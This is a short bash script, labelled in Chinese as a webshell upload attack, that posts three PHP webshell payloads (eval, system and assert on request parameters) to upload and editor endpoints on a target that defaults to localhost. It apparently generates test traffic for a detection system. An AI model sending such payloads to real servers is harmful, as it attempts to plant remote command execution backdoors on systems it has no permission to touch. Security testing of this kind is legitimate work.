#!/bin/bash
# Webshell 上传攻击脚本
# 用法: TARGET=127.0.0.1:8080 ./webshell.sh

TARGET="${TARGET:-127.0.0.1:8080}"
echo "[Webshell] 开始攻击 $TARGET ..."
sleep 1

echo "  [1/3] PHP eval webshell"
curl -s -X POST "http://$TARGET/upload" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "code=cmd=eval(\$_POST[cmd]) test" > /dev/null
sleep 0.3

echo "  [2/3] PHP system webshell"
curl -s -X POST "http://$TARGET/upload" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "exec=system(\$_GET[c]) test" > /dev/null
sleep 0.3

echo "  [3/3] PHP assert webshell"
curl -s -X POST "http://$TARGET/api/editor.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "check=assert(\$_REQUEST[pass]) test" > /dev/null
sleep 0.3

echo "[Webshell] 完成 (3 次攻击)"
